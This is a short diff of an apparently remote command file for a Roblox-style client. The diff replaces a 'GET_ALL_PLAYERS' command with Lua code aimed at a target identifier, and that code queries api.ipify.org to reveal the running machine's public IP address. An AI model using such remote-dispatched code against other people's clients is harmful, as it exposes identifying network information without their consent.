@@ -1,1 +1,1 @@
-{"Target":"GET_ALL_PLAYERS","CommandId":"52122312-32c6-4365-92eb-1d9bde73638d","Code":""}
+{"Target":"4jnm2","CommandId":"bc54f274-9e3c-4ead-a824-6c9e96b2425e","Code":"print(game:GetService(\"HttpService\"):JSONDecode(game:HttpGet(\"https://api.ipify.org/?format=json\")).ip)"}
